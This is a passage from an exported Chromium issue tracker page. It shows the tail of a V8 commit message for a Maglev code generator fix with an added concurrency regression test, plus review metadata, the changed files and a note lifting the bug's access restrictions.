variable arguments, enabling native concurrent Maglev testing in JS.

A robust randomized concurrent regression test is added to verify.

TAG=agy
CONV=8a5b0da0-ce00-46ee-83f5-9a341372b6f7

(cherry picked from commit 00f6ecd8a7cca6911789a11b7a7b01aaf41f925b)

Fixed: 508811474
Change-Id: I69bffdbe6736552e273480c8cf23de25af112739
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7816278
Commit-Queue: Leszek Swirski <leszeks@chromium.org>
Reviewed-by: Patrick Thier <pthier@chromium.org>
Auto-Submit: Leszek Swirski <leszeks@chromium.org>
Commit-Queue: Patrick Thier <pthier@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#107059}
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7923668
Reviewed-by: Leszek Swirski <leszeks@chromium.org>
Commit-Queue: Gyuyoung Kim (xWF) <qkim@google.com>
Cr-Commit-Position: refs/branch-heads/14.4@{#99}
Cr-Branched-From: 80acc26727d5a34e77dabeebe7c9213ec1bd4768-refs/heads/14.4.258@{#1}
Cr-Branched-From: ce7e597e90f6df3fa4b6df224bc613b80c635450-refs/heads/main@{#104020}

```

---

Files:

- M `src/maglev/maglev-code-generator.cc`
- M `src/maglev/maglev-code-generator.h`
- M `src/runtime/runtime.h`
- A `test/mjsunit/maglev/maglev-508811474.js`

---

Hash: [be59876b1dcfd3da2ef63fbc00383c2051d081b5](https://chromiumdash.appspot.com/commit/be59876b1dcfd3da2ef63fbc00383c2051d081b5)  

Date: Tue May 5 10:38:04 2026


---

### eb...@google.com (2026-08-13)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/508811474)*
